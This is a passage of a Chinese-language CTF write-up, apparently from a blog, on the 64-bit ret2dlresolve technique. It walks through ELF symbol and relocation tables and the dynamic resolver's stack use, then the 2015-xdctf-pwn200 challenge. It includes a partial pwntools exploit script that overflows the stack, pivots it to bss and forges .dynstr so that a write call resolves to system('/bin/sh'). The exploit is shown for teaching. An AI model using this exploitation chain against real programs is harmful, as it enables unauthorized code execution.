&lt;offset aStrlen - offset byte_400360, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;strlen&quot;</span></span><br><span class="line">LOAD:<span class="number">00000000004002</span>D0                 Elf64_Sym &lt;offset aSetbuf - offset byte_400360, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;setbuf&quot;</span></span><br><span class="line">LOAD:<span class="number">00000000004002E8</span>                 Elf64_Sym &lt;offset aRead - offset byte_400360, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;read&quot;</span></span><br><span class="line">LOAD:<span class="number">0000000000400300</span>                 Elf64_Sym &lt;offset aLibcStartMain - offset byte_400360, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, \ ; <span class="string">&quot;__libc_start_main&quot;</span></span><br><span class="line">LOAD:<span class="number">0000000000400300</span>                            <span class="number">0</span>&gt;</span><br><span class="line">LOAD:<span class="number">0000000000400318</span>                 Elf64_Sym &lt;offset aGmonStart - offset byte_400360, <span class="number">20</span>h, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;__gmon_start__&quot;</span></span><br><span class="line">LOAD:<span class="number">0000000000400330</span>                 Elf64_Sym &lt;offset aStdout - offset byte_400360, <span class="number">11</span>h, <span class="number">0</span>, <span class="number">18</span>h, \ ; <span class="string">&quot;stdout&quot;</span></span><br><span class="line">LOAD:<span class="number">0000000000400330</span>                            offset __bss_start, <span class="number">8</span>&gt;</span><br><span class="line">LOAD:<span class="number">0000000000400348</span>                 Elf64_Sym &lt;offset aStdin - offset byte_400360, <span class="number">11</span>h, <span class="number">0</span>, <span class="number">18</span>h, \ ; <span class="string">&quot;stdin&quot;</span></span><br><span class="line">LOAD:<span class="number">0000000000400348</span>                            offset <span class="built_in">stdin</span>@@GLIBC_2_2_5, <span class="number">8</span>&gt;</span><br><span class="line">LOAD:<span class="number">0000000000400360</span> ; ELF String Table</span><br></pre></td></tr></table></figure>
+
+<h4 id="rel-plt——DT-JMPREL"><a href="#rel-plt——DT-JMPREL" class="headerlink" title=".rel.plt——DT_JMPREL"></a>.rel.plt——DT_JMPREL</h4><p>ELF JMPREL Relocation Table:Elf64_Rel</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span>                             <span class="comment">//8字节</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span>    <span class="comment">//8字节</span></span><br><span class="line">&#125; Elf64_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span>                             <span class="comment">//8字节</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span>    <span class="comment">//8字节         </span></span><br><span class="line">  Elf64_Sxword	r_addend;		<span class="comment">/* Addend */</span>                              <span class="comment">//8字节</span></span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Xword;</span><br><span class="line"><span class="keyword">typedef</span>	<span class="keyword">int64_t</span>  Elf64_Sxword;      </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">00000000004003F</span>0 ; ELF RELA Relocation Table</span><br><span class="line">LOAD:<span class="number">00000000004003F</span>0                 Elf64_Rela &lt;<span class="number">600</span>AD8h, <span class="number">500000006</span>h, <span class="number">0</span>&gt; ; R_X86_64_GLOB_DAT __libc_start_main</span><br><span class="line">LOAD:<span class="number">0000000000400408</span>                 Elf64_Rela &lt;<span class="number">600</span>AE0h, <span class="number">600000006</span>h, <span class="number">0</span>&gt; ; R_X86_64_GLOB_DAT __gmon_start__</span><br><span class="line">LOAD:<span class="number">0000000000400420</span>                 Elf64_Rela &lt;<span class="number">600B</span>30h, <span class="number">700000005</span>h, <span class="number">0</span>&gt; ; R_X86_64_COPY <span class="built_in">stdout</span></span><br><span class="line">LOAD:<span class="number">0000000000400438</span>                 Elf64_Rela &lt;<span class="number">600B</span>40h, <span class="number">800000005</span>h, <span class="number">0</span>&gt; ; R_X86_64_COPY <span class="built_in">stdin</span></span><br><span class="line">LOAD:<span class="number">0000000000400450</span> ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:<span class="number">0000000000400450</span>                 Elf64_Rela &lt;<span class="number">600B</span>00h, <span class="number">100000007</span>h, <span class="number">0</span>&gt; ; R_X86_64_JUMP_SLOT write</span><br><span class="line">LOAD:<span class="number">0000000000400468</span>                 Elf64_Rela &lt;<span class="number">600B</span>08h, <span class="number">200000007</span>h, <span class="number">0</span>&gt; ; R_X86_64_JUMP_SLOT <span class="built_in">strlen</span></span><br><span class="line">LOAD:<span class="number">0000000000400480</span>                 Elf64_Rela &lt;<span class="number">600B</span>10h, <span class="number">300000007</span>h, <span class="number">0</span>&gt; ; R_X86_64_JUMP_SLOT setbuf</span><br><span class="line">LOAD:<span class="number">0000000000400498</span>                 Elf64_Rela &lt;<span class="number">600B</span>18h, <span class="number">400000007</span>h, <span class="number">0</span>&gt; ; R_X86_64_JUMP_SLOT read</span><br><span class="line">LOAD:<span class="number">0000000000400498</span> LOAD            ends</span><br><span class="line">LOAD:<span class="number">0000000000400498</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="dl-runtime-resolve-xsave"><a href="#dl-runtime-resolve-xsave" class="headerlink" title="_dl_runtime_resolve_xsave"></a>_dl_runtime_resolve_xsave</h4><p><img src="C:\Users\wqf\AppData\Roaming\Typora\typora-user-images\image-20220702124924060.png" alt="image-20220702124924060"></p>
+<p>64位程序中调用函数的名称是<code>_dl_runtime_resolve_xsave</code>，但是其与<code>_dl_runtime_resolve</code>的参数一样的，<code>_dl_runtime_resolve_xsavec(link_map,reloc_arg)</code>注意这里的reloc_arg不再是偏移而是索引，这里伪造reloc_arg时需要注意。</p>
+<blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _dl_runtime_resolve	_dl_runtime_resolve_xsave</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _dl_runtime_resolve	_dl_runtime_resolve_xsavec</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.plt:<span class="number">00000000004004</span>D6 ; ---------------------------------------------------------------------------</span><br><span class="line">.plt:<span class="number">00000000004004</span>DC                 align <span class="number">20</span>h</span><br><span class="line">.plt:<span class="number">00000000004004E0</span> ; [<span class="number">00000006</span> BYTES: COLLAPSED FUNCTION _write. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br><span class="line">.plt:<span class="number">00000000004004E6</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.plt:<span class="number">00000000004004E6</span>                 push    <span class="number">0</span></span><br><span class="line">.plt:<span class="number">00000000004004</span>EB                 jmp     sub_4004D0</span><br><span class="line">.plt:<span class="number">00000000004004F</span>0 ; [<span class="number">00000006</span> BYTES: COLLAPSED FUNCTION _strlen. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br><span class="line">.plt:<span class="number">00000000004004F</span>6 ; ---------------------------------------------------------------------------</span><br><span class="line">.plt:<span class="number">00000000004004F</span>6                 push    <span class="number">1</span></span><br><span class="line">.plt:<span class="number">00000000004004F</span>B                 jmp     sub_4004D0</span><br><span class="line">.plt:<span class="number">0000000000400500</span> ; [<span class="number">00000006</span> BYTES: COLLAPSED FUNCTION _setbuf. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br><span class="line">.plt:<span class="number">0000000000400506</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.plt:<span class="number">0000000000400506</span>                 push    <span class="number">2</span></span><br><span class="line">.plt:<span class="number">000000000040050B</span>                 jmp     sub_4004D0</span><br><span class="line">.plt:<span class="number">0000000000400510</span> ; [<span class="number">00000006</span> BYTES: COLLAPSED FUNCTION _read. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br><span class="line">.plt:<span class="number">0000000000400516</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.plt:<span class="number">0000000000400516</span>                 push    <span class="number">3</span></span><br><span class="line">.plt:<span class="number">000000000040051B</span>                 jmp     sub_4004D0</span><br><span class="line">.plt:<span class="number">000000000040051B</span> ; &#125; <span class="comment">// starts at 4004D0</span></span><br><span class="line">.plt:<span class="number">000000000040051B</span> _plt            ends</span><br></pre></td></tr></table></figure>
+
+<h4 id="dl-fixup"><a href="#dl-fixup" class="headerlink" title="_dl_fixup"></a>_dl_fixup</h4><p>与32位一样</p>
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p><code>_dl_runtime_resolve</code> 会在栈中保存大量的数据</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000177</span>A0 ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000000177</span>A0                 push    rbx</span><br><span class="line">.text:<span class="number">00000000000177</span>A1                 mov     rbx, rsp</span><br><span class="line">.text:<span class="number">00000000000177</span>A4                 <span class="keyword">and</span>     rsp, <span class="number">0F</span>FFFFFFFFFFFFFC0h</span><br><span class="line">.text:<span class="number">00000000000177</span>A8                 sub     rsp, cs:qword_227808</span><br><span class="line">.text:<span class="number">00000000000177</span>AF                 mov     [rsp+<span class="number">8</span>+var_8], rax</span><br><span class="line">.text:<span class="number">00000000000177B</span>3                 mov     [rsp+<span class="number">8</span>], rcx</span><br><span class="line">.text:<span class="number">00000000000177B</span>8                 mov     [rsp+<span class="number">8</span>+arg_0], rdx</span><br><span class="line">.text:<span class="number">00000000000177B</span>D                 mov     [rsp+<span class="number">8</span>+arg_8], rsi</span><br><span class="line">.text:<span class="number">00000000000177</span>C2                 mov     [rsp+<span class="number">8</span>+arg_10], rdi</span><br><span class="line">.text:<span class="number">00000000000177</span>C7                 mov     [rsp+<span class="number">8</span>+arg_18], r8</span><br><span class="line">.text:<span class="number">00000000000177</span>CC                 mov     [rsp+<span class="number">8</span>+arg_20], r9</span><br><span class="line">.text:<span class="number">00000000000177</span>D1                 mov     eax, <span class="number">0</span>EEh</span><br><span class="line">.text:<span class="number">00000000000177</span>D6                 <span class="keyword">xor</span>     edx, edx</span><br><span class="line">.text:<span class="number">00000000000177</span>D8                 mov     [rsp+<span class="number">8</span>+arg_240], rdx</span><br><span class="line">.text:<span class="number">00000000000177E0</span>                 mov     [rsp+<span class="number">8</span>+arg_248], rdx</span><br><span class="line">.text:<span class="number">00000000000177E8</span>                 mov     [rsp+<span class="number">8</span>+arg_250], rdx</span><br><span class="line">.text:<span class="number">00000000000177F</span>0                 mov     [rsp+<span class="number">8</span>+arg_258], rdx</span><br><span class="line">.text:<span class="number">00000000000177F</span>8                 mov     [rsp+<span class="number">8</span>+arg_260], rdx</span><br><span class="line">.text:<span class="number">0000000000017800</span>                 mov     [rsp+<span class="number">8</span>+arg_268], rdx</span><br><span class="line">.text:<span class="number">0000000000017808</span>                 xsavec  [rsp+<span class="number">8</span>+arg_30]</span><br><span class="line">.text:<span class="number">000000000001780</span>D                 mov     rsi, [rbx+<span class="number">10</span>h]</span><br><span class="line">.text:<span class="number">0000000000017811</span>                 mov     rdi, [rbx+<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">0000000000017815</span>                 call    sub_FE40</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          <span class="number">0x400000</span>           <span class="number">0x401000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/<span class="number">2015</span>-xdctf-pwn200/<span class="number">64</span>/no-relro/main_no_relro_64</span><br><span class="line">          <span class="number">0x600000</span>           <span class="number">0x601000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/<span class="number">2015</span>-xdctf-pwn200/<span class="number">64</span>/no-relro/main_no_relro_64</span><br><span class="line">    <span class="number">0x7f25129b3000</span>     <span class="number">0x7f2512b9a000</span> r-xp   <span class="number">1e7000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/libc<span class="number">-2.27</span>.so</span><br><span class="line">    <span class="number">0x7f2512b9a000</span>     <span class="number">0x7f2512d9a000</span> ---p   <span class="number">200000</span> <span class="number">1e7000</span> /lib/x86_64-linux-gnu/libc<span class="number">-2.27</span>.so</span><br><span class="line">    <span class="number">0x7f2512d9a000</span>     <span class="number">0x7f2512d9e000</span> r--p     <span class="number">4000</span> <span class="number">1e7000</span> /lib/x86_64-linux-gnu/libc<span class="number">-2.27</span>.so</span><br><span class="line">    <span class="number">0x7f2512d9e000</span>     <span class="number">0x7f2512da0000</span> rw-p     <span class="number">2000</span> <span class="number">1</span>eb000 /lib/x86_64-linux-gnu/libc<span class="number">-2.27</span>.so</span><br><span class="line">    <span class="number">0x7f2512da0000</span>     <span class="number">0x7f2512da4000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7f2512da4000</span>     <span class="number">0x7f2512dcb000</span> r-xp    <span class="number">27000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld<span class="number">-2.27</span>.so</span><br><span class="line">    <span class="number">0x7f2512fae000</span>     <span class="number">0x7f2512fb0000</span> rw-p     <span class="number">2000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7f2512fcb000</span>     <span class="number">0x7f2512fcc000</span> r--p     <span class="number">1000</span> <span class="number">27000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.27</span>.so</span><br><span class="line">    <span class="number">0x7f2512fcc000</span>     <span class="number">0x7f2512fcd000</span> rw-p     <span class="number">1000</span> <span class="number">28000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.27</span>.so</span><br><span class="line">    <span class="number">0x7f2512fcd000</span>     <span class="number">0x7f2512fce000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7fff26cdd000</span>     <span class="number">0x7fff26cff000</span> rw-p    <span class="number">22000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line">    <span class="number">0x7fff26d19000</span>     <span class="number">0x7fff26d1c000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7fff26d1c000</span>     <span class="number">0x7fff26d1e000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br><span class="line">pwndbg&gt; x/gx <span class="number">0x7f2512da4000</span>+<span class="number">0x227808</span></span><br><span class="line"><span class="number">0x7f2512fcb808</span> &lt;_rtld_global_ro+<span class="number">168</span>&gt;:   <span class="number">0x0000000000000380</span></span><br></pre></td></tr></table></figure>
+
+<p>执行完下列指令后</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f2512dbb7a8</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">8</span>&gt;     sub    rsp, qword ptr [rip + <span class="number">0x210059</span>] &lt;<span class="number">0x7f2512fcb808</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>栈地址到了 0x600a00（我们是将栈迁移到了 bss_addr+0x100，即 0x600C30），即到了 .dynamic 节中，后续在栈中保存数据时会破坏 .dynamic 节中的内容，最后导致了 dl_fixup 崩溃。</p>
+<p>因此我们考虑将栈迁移至更高的位置</p>
+<p>我们可以考虑把栈再迁移的高一些，程序中与 bss 相关的映射只有 0x600000-0x601000，即一页。与此同时bss 段的起始地址为 0x600B30 ，伪造的栈的数据一共有 392 （0x188）  。所以直接栈迁移到 bss 节很容易出现问题。可以考虑迁移至bss_addr+0x200</p>
+<h3 id="例题：2015-xdctfpwn200"><a href="#例题：2015-xdctfpwn200" class="headerlink" title="例题：2015-xdctfpwn200"></a>例题：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200">2015-xdctfpwn200</a></h3><h4 id="No-RELRO"><a href="#No-RELRO" class="headerlink" title="No RELRO"></a>No RELRO</h4><h5 id="保护检查"><a href="#保护检查" class="headerlink" title="保护检查"></a>保护检查</h5><p><img src="C:\Users\wqf\AppData\Roaming\Typora\typora-user-images\image-20220702155244346.png" alt="image-20220702155244346"></p>
+<h5 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+28h] [rbp-48h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+30h] [rbp-40h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+38h] [rbp-38h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+40h] [rbp-30h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+48h] [rbp-28h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+60h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(buf, <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>);</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="number">0LL</span>;</span><br><span class="line">  v14 = <span class="number">0LL</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  setbuf(_bss_start, buf);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  write(<span class="number">1</span>, buf, v3);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>存在栈溢出漏洞</p>
+<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>我们可以在bss或栈上伪造一个ELF String Table（.dynstr section）（将某个函数更改为system），然后覆盖对应的结构体指针为fake_dynstr。大致过程与32位的相似，但是64位程序使用寄存器传参，其构造过程可能比较复杂。</p>
+<blockquote>
+<p>首先说一下64位文件的传参方式：当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。当参数为7个以上时， 前 6 个与前面一样， 但后面的依次 放入栈中，即和32位程序一样</p>
+</blockquote>
+<h5 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h5><p>思路一：</p>
+<p>首先将程序迁移至bss段，在bss段伪造一个fake_dynstr，将write 改写为system。然后篡改strtab指向fake_dynstr即p64(bss_addr+0x300+136)，136是因为前面有17个p64。然后再调用write@plt+6(实际调用为system)，并将参数设置为写在bss段的”/bin/sh\x00”指针，即可调用system(“/bin/sh\x00”)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./main_no_relro_64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main_no_relro_64&#x27;</span>)</span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line"></span><br><span class="line">leave_ret=<span class="number">0x000000000040063c</span></span><br><span class="line">pop_addr=<span class="number">0x40076a</span>  </span><br><span class="line">move_addr=<span class="number">0x400750</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.text:0000000000400750 loc_400750:                             ; CODE XREF: __libc_csu_init+54↓j</span></span><br><span class="line"><span class="string">.text:0000000000400750                 mov     rdx, r15</span></span><br><span class="line"><span class="string">.text:0000000000400753                 mov     rsi, r14</span></span><br><span class="line"><span class="string">.text:0000000000400756                 mov     edi, r13d</span></span><br><span class="line"><span class="string">.text:0000000000400759                 call    ds:(__frame_dummy_init_array_entry - 6008F8h)[r12+rbx*8]</span></span><br><span class="line"><span class="string">.text:000000000040075D                 add     rbx, 1</span></span><br><span class="line"><span class="string">.text:0000000000400761                 cmp     rbp, rbx</span></span><br><span class="line"><span class="string">.text:0000000000400764                 jnz     short loc_400750</span></span><br><span class="line"><span class="string">.text:0000000000400766</span></span><br><span class="line"><span class="string">.text:0000000000400766 loc_400766:                             ; CODE XREF: __libc_csu_init+34↑j</span></span><br><span class="line"><span class="string">.text:0000000000400766                 add     rsp, 8</span></span><br><span class="line"><span class="string">.text:000000000040076A                 pop     rbx</span></span><br><span class="line"><span class="string">.text:000000000040076B                 pop     rbp</span></span><br><span class="line"><span class="string">.text:000000000040076C                 pop     r12</span></span><br><span class="line"><span class="string">.text:000000000040076E                 pop     r13</span></span><br><span class="line"><span class="string">.text:0000000000400770                 pop     r14</span></span><br><span class="line"><span class="string">.text:0000000000400772                 pop     r15</span></span><br><span class="line"><span class="string">.text:0000000000400774                 retn</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">new_stack=bss_addr+<span class="number">0x200</span></span><br><span class="line">pop_rbp=<span class="number">0x00400588</span></span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr=elf.symbols[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">strtab=<span class="number">0x0000000000600988</span>+<span class="number">0x8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload1+=p64(pop_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">0</span>)+p64(bss_addr+<span class="number">0x300</span>)+p64(<span class="number">0x500</span>)</span><br><span class="line">payload1+=p64(move_addr)+<span class="string">&#x27;a&#x27;</span>*(<span class="number">8</span>*<span class="number">2</span>)+p64(bss_addr+<span class="number">0x300</span>)+<span class="string">&#x27;a&#x27;</span>*(<span class="number">8</span>*<span class="number">4</span>)+p64(leave_ret)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">fake_dynstr=dynstr.replace(<span class="string">&#x27;write&#x27;</span>,<span 